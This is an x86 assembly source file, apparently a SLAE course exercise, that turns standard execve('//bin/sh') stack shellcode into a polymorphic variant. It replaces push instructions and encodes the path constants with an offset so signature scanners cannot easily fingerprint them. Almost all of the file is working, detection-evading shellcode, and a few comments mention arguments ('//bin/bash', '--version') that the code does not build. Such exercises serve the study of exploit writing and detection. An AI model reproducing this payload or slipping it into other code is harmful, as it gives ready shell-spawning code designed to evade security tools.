; File: poly.nasm
; Author: Kevin Ren, originally Professor Viviek of SLAE
; Purpose: to demostrate polymorphism with stack-execve shellcode example

; NOTE: polymorphism meaning changing instructions to preserve the same functionality in a script
; THINGS CHANGED: 
;			1. xor eax, eax ==> moving value of ebx into eax, and xoring the two
;			2. push instructions ==> moving value to an offset in stack memory, then adjusting the esp
;			3. reverse hex is replaced with 0x11111111 off, then adding the two, so the original hex cant be easily fingerprinted
;			   also remember this is very flexible, we could have chose any offset

global _start:


section .text
_start: 
        ;xor eax, eax                            ; first dword of zeros needs to be pushed onto stack
        mov eax, ebx
	xor eax, ebx

	;push eax
	mov dword [esp - 4], eax
	sub esp, 0x4


        ;push 0x68732f6e                         ; pushing //bin/sh in reverse hex order
	mov edi, 0x57621e5d
	add edi, 0x11111111	
       	mov dword [esp - 4], edi
		
	;push 0x69622f2f                         ; NOTE: these pushes can be replaced with any path to exe in reverse hex, such as //bin/ls, etc
	mov esi, 0x58511e1e
	add esi, 0x11111111
	mov dword [esp - 8], esi
	
	sub esp, 0x8


        mov ebx, esp                            ; 1st arg, setting filename arguemnt to the current stack which points to //bin/sh0000
        
        ;push eax                                ; 3rd arg, second dword of zeros are pushed for env[] structure
	mov dword [esp - 4], eax
	sub esp, 0x4
        
	mov edx, esp                            

        
	;push ebx                                ; pushing the address of null terminated filename //bin/sh000
        mov dword [esp - 4], ebx
	sub esp, 0x4

	mov ecx, esp                            ; 2nd argument, includes address(////bin/bash0000) + address(--version000) + 0000

        
	mov al, 0xb                             ; setting up and invoking execve syscall, 0xb for syscall number 11
        int 0x80
